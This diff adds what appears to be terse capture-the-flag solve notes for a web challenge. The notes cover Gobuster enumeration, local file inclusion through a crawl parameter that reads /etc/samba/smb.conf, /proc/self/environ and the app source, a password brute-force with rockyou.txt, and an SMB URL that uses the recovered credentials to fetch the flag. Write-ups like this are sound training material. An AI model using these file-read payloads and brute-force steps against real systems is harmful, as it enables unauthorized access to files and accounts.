@@ -1,0 +1,35 @@
+Gobuster
+	/console (protected by Pin)
+
+/v1
+	V1 API ROUTE - disabled, see recent changelog
+/v2
+	V2 API ROUTE
+
+http://138.68.93.187:6960/v2/CHANGELOG
+	#1: V1 context - V1 api routes disabled after sambacry
+	#2: V2 context - crawl route parammeter changed to 'adshua' to prevent abuse
+	#3: V2 context - added new safe SMbHandler to prevent sambacry
+
+SMB /v2/crawl
+
+LFI
+	http://138.68.93.187:6960/v2/crawl?adshua=file:///etc/samba/smb.conf
+		[josh]
+		    path = /samba/josh
+		    browseable = yes
+		    read only = yes
+		    guest ok = yes
+		    force create mode = 0660
+		    force directory mode = 2770
+		    valid users = josh @sadmin
+	http://138.68.93.187:6960/v2/crawl?adshua=file:///proc/self/environ
+		/home/ctfuser/app.py
+	http://138.68.93.187:6960/v2/crawl?adshua=file:///home/ctfuser/app.py
+
+Bruteforce josh's password
+- python3 brute.py rockyou.txt
+	christian
+
+http://138.68.93.187:6960/v2/smb?onlyifyouknowthesourcecode=smb://josh:christian@localhost/josh/flag.txt
+	ctf{6056850ae00cb2cdc76d2bfa0bcb40ee3cc744702a31af0a8edd7fb2872da6f9}
